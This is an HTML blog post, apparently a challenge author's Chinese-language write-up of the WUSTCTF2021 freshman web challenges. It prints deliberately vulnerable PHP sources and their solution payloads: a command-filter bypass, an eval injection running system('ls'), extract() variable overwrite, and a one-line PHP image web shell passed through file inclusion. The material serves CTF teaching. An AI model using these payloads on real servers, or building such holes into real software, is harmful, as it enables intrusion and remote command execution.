@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言此次参与了新生赛 web方向的出题，出的题都比较基础，以下是WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“蚁景杯”WUSTCTF2021新生赛web">
+<meta property="og:url" content="http://example.com/2021/01/29/%E2%80%9C%E8%9A%81%E6%99%AF%E6%9D%AF%E2%80%9DWUSTCTF2021%E6%96%B0%E7%94%9F%E8%B5%9Bweb/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言此次参与了新生赛 web方向的出题，出的题都比较基础，以下是WP">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-29T09:01:13.000Z">
+<meta property="article:modified_time" content="2024-09-08T04:38:16.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/01/29/%E2%80%9C%E8%9A%81%E6%99%AF%E6%9D%AF%E2%80%9DWUSTCTF2021%E6%96%B0%E7%94%9F%E8%B5%9Bweb/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/01/29/%E2%80%9C%E8%9A%81%E6%99%AF%E6%9D%AF%E2%80%9DWUSTCTF2021%E6%96%B0%E7%94%9F%E8%B5%9Bweb/","path":"2021/01/29/“蚁景杯”WUSTCTF2021新生赛web/","title":"“蚁景杯”WUSTCTF2021新生赛web"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>“蚁景杯”WUSTCTF2021新生赛web | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyWeb"><span class="nav-number">1.1.1.</span> <span class="nav-text">EasyWeb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web2"><span class="nav-number">1.1.2.</span> <span class="nav-text">Web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%9B%E7%9B%BE"><span class="nav-number">1.1.3.</span> <span class="nav-text">矛盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.4.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cover"><span class="nav-number">1.1.5.</span> <span class="nav-text">Cover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyUpload"><span class="nav-number">1.1.6.</span> <span class="nav-text">EasyUpload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyPHP"><span class="nav-number">1.1.7.</span> <span class="nav-text">BabyPHP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/29/%E2%80%9C%E8%9A%81%E6%99%AF%E6%9D%AF%E2%80%9DWUSTCTF2021%E6%96%B0%E7%94%9F%E8%B5%9Bweb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="“蚁景杯”WUSTCTF2021新生赛web | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          “蚁景杯”WUSTCTF2021新生赛web
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-29 17:01:13" itemprop="dateCreated datePublished" datetime="2021-01-29T17:01:13+08:00">2021-01-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 12:38:16" itemprop="dateModified" datetime="2024-09-08T12:38:16+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次参与了新生赛 web方向的出题，出的题都比较基础，以下是WP</p>
+<span id="more"></span>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>题目打开都是图片，给了两句提示，我们f12看一下，发现给了提示：</p>
+<p>base64解码一下 ：<code>get_flag.php</code> 访问之后就是最基础的传参：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;f1ag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wbb&#x27;</span>] === <span class="string">&#x27;cute&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>] === <span class="string">&#x27;wust2021&#x27;</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f1ag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p> payload:</p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>机器人总动员，联想到最简单的robots协议，访问一下robots.txt后得到：</p>
+<p>访问它得到flag:</p>
+<h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="comment">//矛盾 </span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$s1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>];</span><br><span class="line"><span class="variable">$s2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> !== <span class="string">&#x27;42&#x27;</span>&amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="number">42</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s1</span>!==<span class="variable">$s2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$s1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$s2</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;差一点!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;再想想!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里运用到了intval函数的性质和php弱比较 ，有两层，因为 intval(042)&#x3D;42，那这里直接用042就可以绕过第一层，具体intval函数的用法可以参考php官方文档。</p>
+<p>第二层 可以用数组绕过，也可以用弱比较绕过(找到两个不同字符串,md5加密后都是0e开头)</p>
+<p>payload1（数组绕过 <code>?num=042&amp;s1[]=1&amp;s2=[]</code></p>
+<p>payload2 （弱比较 <code>?num=042&amp;s1=s878926199a&amp;s2=s214587387a</code>  这里s1和s2的值可以是其他，我随意找的两个。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|cat|\s/i&#x27;</span>,<span class="variable">$cmd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;换个方式&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);<span class="comment">//最简单的命令执行，没有之一</span></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如题所说，最简单的命令执行，没有之一，简单的过滤了一下flag，cat，空格。</p>
+<p>依次想办法绕过就行了 flag这里可以用斜杠，也可以用?匹配 等，cat也可以用反斜杠，也可以找等效的命令 如 <code>tac more</code> 等</p>
+<p>空格的绕过可以用 <code>$IFS$9、 $&#123;IFS&#125;</code> 等 </p>
+<p>其中一种方式的payload: <code>?cmd=ca\t$&#123;IFS&#125;/fla\g.txt</code></p>
+<h3 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h3><p>其实这个题目，我是想考察考察$GLOBALS变量和变量覆盖，通过 $GLOBALS 拿到第一个提示进入后面的变量覆盖考点，但其实第一步就可以直接rce了。</p>
+<p>先说说预期解：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint:php $GLOBALS</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里给了提示，$GLOBALS，是一个超级全局变量，又有 $$ 我们想到可以直接把全局变量给打印出来，搞不好flag直接就在变量里面。所以传参<code>?a=GLOBALS</code> 后得到：</p>
+<p>发现确实存在Flag，不过是错误的，但给了一个hint 我们访问 <code>c0ver2.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag_is_there.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$choices</span> = <span class="keyword">array</span>(<span class="string">&#x27;choice1&#x27;</span>=&gt;<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;choice2&#x27;</span>=&gt;<span class="string">&#x27;2.txt&#x27;</span>,<span class="string">&#x27;choice3&#x27;</span>=&gt;<span class="string">&#x27;3.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cover&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cover&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cover&#x27;</span>], EXTR_OVERWRITE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;choice&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$choice</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;choice&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$choice</span>, <span class="variable">$choices</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No! You only have 3 choice except you can break it ~&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$choices</span>[<span class="variable">$choice</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please choice one !&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>包含了<code>flag_is_there.php</code>，然后存在 <code>file_get_contents</code>函数 很自然的思路是想办法通过这个函数拿到<code>flag_is_there.php</code>的内容，但是choices数组被写死了，似乎只能拿到<code>1.txt</code>，<code>2.txt</code>,<code>3.txt</code>的内容，但是发现这里有一个extract函数，所以我们可利用它来实现变量覆盖，这里用到二维数组实现：<code>?cover[choices][choice1]=flag_is_there.php&amp;choice=choice1</code> F12得到flag</p>
+<p> 非预期：</p>
+<p>第一步里面：<code>eval(&quot;var_dump($$a);&quot;);</code>  这个$a 参数没有任何过滤，所以我们可以传</p>
+<p><code>?a=a=1);system(&#39;ls&#39;);//</code>  直接rce ：</p>
+<h3 id="EasyUpload"><a href="#EasyUpload" class="headerlink" title="EasyUpload"></a>EasyUpload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//try to visit upload_file.php </span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Oh no!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>一开始给了提示 有一个上传的点 ，<code>upload_file.php</code>  ，然后题目也给了源码上传点处理的源码，主要看这几行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Php file ?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&#x27;Bad file&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;\?php|eval|assert|@/i&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file_content</span>)))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&#x27;Bad file of content !&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后缀用黑名单，文件类型限制为图片，文件内容也做了限制。考虑到前面有一个index.php中 <code>include</code> 函数，所以考虑包含图片马，后缀和类型我们可以轻松绕过，而关于文件内容绕过，过滤了 <code>&lt;?php</code>我们可以用<code>&lt;script&gt;标签</code>绕过，过滤了<code>eval</code>和<code>assert</code> 可以用拼接绕过，不过这里没有过滤system,那就直接用system。</p>
+<p>在windows下合成 <code>.png</code> 图片马  php 文件内容为：<code>&lt;script language=&#39;php&#39;&gt;system($_GET[cmd]);&lt;/script&gt;</code>  </p>
+<p>上传之后，我们在<code>index.php</code>包含图片路径并传入命令参数，成功回显：</p>
+<p>然后拿到根目录下flag:</p>
+<h3 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h3><p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2283.html#WUSTCTF%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8ERevenge">https://www.gem-love.com/ctf/2283.html#WUSTCTF%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8ERevenge</a></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以前自己都是做题的一方，这是第一次作为出题的一方，环境部署过程中也遇到了一些问题。出题的确也可以学到很多东西，对一个知识的理解会加深一点，另外这次很多问题出在了linux权限上，也引起了我的注意。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/25/DJB%E6%9D%AFWeb/" rel="prev" title="DJB杯Web">
+                  <i class="fa fa-angle-left"></i> DJB杯Web
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/01/%E5%88%9D%E6%8E%A2ssrf/" rel="next" title="初探ssrf">
+                  初探ssrf <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
